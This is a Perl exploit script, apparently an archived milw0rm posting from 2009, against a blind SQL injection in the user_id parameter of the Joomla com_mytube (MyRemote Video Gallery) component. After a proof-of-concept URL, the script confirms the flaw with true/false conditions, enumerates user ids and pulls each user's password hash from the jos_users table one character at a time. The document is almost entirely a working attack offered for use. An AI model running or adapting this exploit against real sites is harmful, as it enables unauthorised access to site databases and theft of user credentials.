<html><head><title>Joomla com_mytube (user_id) Blind SQL Injection Exploit</title></head><pre>#!/usr/bin/perl -w

#---------------------------------------------------------------------------------
#joomla component com_mytube (user_id) Blind SQL Injection Vulnerability
#---------------------------------------------------------------------------------

#Author         : Chip D3 Bi0s
#Group          : LatiHackTeam
#Email          : chipdebios[alt+64]gmail.com
#Date           : 15 September 2009
#Critical Lvl   : Moderate
#Impact	        : Exposure of sensitive information
#Where	        : From Remote
#---------------------------------------------------------------------------

#Affected software description:
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

#Application   : MyRemote Video Gallery
#version       : 1.0 Beta 
#Developer     : Jomtube Team
#License       : GPL            type  : Non-Commercial
#Date Added    : Aug 24, 2009
#Download      : http://joomlacode.org/gf/download/frsrelease/10834/42943/com_mytube_1.0.0_2009.08.02.zip
#Description   :

#MyRemote Video Gallery is the most Powerful Video Extension made for Joomla 1.5x
#which will allow you to transform your Website into a professional looking Video
#Gallery with functionality that is similar to YouTube.com. MyRemote Video Gallery
#is an open source (GNU GPL) video sharing Joomla extension has been created
#specifically for the Joomla 1.5x (MVC) Framework and can not be used without Joomla.

#MyRemote Video Gallery gives you the option to Embed Videos from Youtube and offers
#the Framework so you can create your own Remote Plugins for other Remote Servers like
#Dailymotion, Google Video, Vimeo, Blip.tv, Clipser, Revver, a which will allow you to
#run your site for low cost since all the bandwidth usage and hard drive space is located
#on the video server sites. So if you already have a large library of Videos on some
#Remote Sites like Youtube.com you can build the Video Part of your Site Very Quickly.

#---------------------------------------------------------------------------


#I.Blind SQL injection (user_id)
#Poc/Exploit:
#~~~~~~~~~~~
#http://127.0.0.1/[path]/index.php?view=videos&amp;type=member&amp;user_id=X[blind]&amp;option=com_mytube&amp;Itemid=null
#X: Valid User_id

#+++++++++++++++++++++++++++++++++++++++
#[!] Produced in South America
#+++++++++++++++++++++++++++++++++++++++


use LWP::UserAgent;
use Benchmark;
my $t1 = new Benchmark;

system ('cls');
print &quot;\n\n&quot;;
print &quot;\t\t[+] ---------------------------------[+]\n&quot;;
print &quot;\t\t|          |  Chip d3 Bi0s |          |\n&quot;;
print &quot;\t\t|        MyRemote Video Gallery Bsql  | \n&quot;;
print &quot;\t\t|joomla component com_mytube (user_id)| \n&quot;;
print &quot;\t\t[+]----------------------------------[+]\n\n&quot;;


print &quot;http://127.0.0.1/[path]/index.php?view=videos&amp;type=member&amp;user_id=62:\n&quot;;chomp(my $target=&lt;STDIN&gt;);

$w=&quot;Total Videos In Category&quot;;
$column_name=&quot;concat(password)&quot;;
$table_name=&quot;jos_users&quot;;


$b = LWP::UserAgent-&gt;new() or die &quot;Could not initialize browser\n&quot;;
$b-&gt;agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');

print &quot;----------------Inyectando----------------\n&quot;;


  $host = $target . &quot;+and+1=1&amp;option=com_mytube&amp;Itemid=null&quot;;
  my $res = $b-&gt;request(HTTP::Request-&gt;new(GET=&gt;$host));  my $content = $res-&gt;content;  my $regexp = $w;
  if ($content =~ /$regexp/) {

$host = $target . &quot;+and+1=2&amp;option=com_mytube&amp;Itemid=null&quot;;
  my $res = $b-&gt;request(HTTP::Request-&gt;new(GET=&gt;$host));  my $content = $res-&gt;content;  my $regexp = $w;
  if ($content =~ /$regexp/) {print &quot; [-] Exploit Fallo :(\n&quot;;}

else

{print &quot; [-] Vulnerable :)\n&quot;;

$d=0;


for ($idusuario=62;$idusuario&lt;=80;$idusuario++) 

{
                    
 $host = $target . &quot;+and+ascii(substring((SELECT+&quot;.$column_name.&quot;+from+&quot;.$table_name.&quot;+where+id=&quot;.$idusuario.&quot;+limit+0,1),1,1))&gt;0&amp;option=com_mytube&amp;Itemid=null&quot;;
 my $res = $b-&gt;request(HTTP::Request-&gt;new(GET=&gt;$host));
 my $content = $res-&gt;content;
 my $regexp = $w;
 if ($content =~ /$regexp/) {$idusu[$d]=$idusuario;$d=$d+1}

 }

 print &quot; [+] Usuario existentes : &quot;.&quot; &quot;.join(',', @idusu) . &quot;\n&quot;;

print  &quot; [-] # Usuario que desea extraer : &quot;;chomp($iduss=&lt;STDIN&gt;);

for ($x=1;$x&lt;=32;$x++) 
	{

  $host = $target . &quot;+and+ascii(substring((SELECT+&quot;.$column_name.&quot;+from+&quot;.$table_name.&quot;+where+id=&quot;.$iduss.&quot;+limit+0,1),&quot;.$x.&quot;,1))&gt;57&amp;option=com_mytube&amp;Itemid=null&quot;;
  my $res = $b-&gt;request(HTTP::Request-&gt;new(GET=&gt;$host));  my $content = $res-&gt;content;  my $regexp = $w;
  print &quot; [!] &quot;;if($x &lt;= 9 ) {print &quot;0$x&quot;;}else{print $x;}
  if ($content =~ /$regexp/)
  {
  
          for ($c=97;$c&lt;=102;$c++) 

{
 $host = $target . &quot;+and+ascii(substring((SELECT+&quot;.$column_name.&quot;+from+&quot;.$table_name.&quot;+where+id=&quot;.$iduss.&quot;+limit+0,1),&quot;.$x.&quot;,1))=&quot;.$c.&quot;&amp;option=com_mytube&amp;Itemid=null&quot;;
 my $res = $b-&gt;request(HTTP::Request-&gt;new(GET=&gt;$host));
 my $content = $res-&gt;content;
 my $regexp = $w;


 if ($content =~ /$regexp/) {$char=chr($c); $caracter[$x-1]=chr($c); print &quot;-Caracter: $char\n&quot;; $c=102;}
 }


  }
else
{

for ($c=48;$c&lt;=57;$c++) 

{
 $host = $target . &quot;+and+ascii(substring((SELECT+&quot;.$column_name.&quot;+from+&quot;.$table_name.&quot;+where+id=&quot;.$iduss.&quot;+limit+0,1),&quot;.$x.&quot;,1))=&quot;.$c.&quot;&amp;option=com_mytube&amp;Itemid=null&quot;;
 my $res = $b-&gt;request(HTTP::Request-&gt;new(GET=&gt;$host));
 my $content = $res-&gt;content;
 my $regexp = $w;

 if ($content =~ /$regexp/) {$char=chr($c); $caracter[$x-1]=chr($c); print &quot;-Caracter: $char\n&quot;; $c=57;}
 }


}

	}

print &quot; [+] Password   :&quot;.&quot; &quot;.join('', @caracter) . &quot;\n&quot;;

my $t2 = new Benchmark;
my $tt = timediff($t2, $t1);
print &quot;El script tomo:&quot;,timestr($tt),&quot;\n&quot;;

}
}

else

{print &quot; [-] Exploit Fallo :(\n&quot;;}

# milw0rm.com [2009-09-21]</pre></html>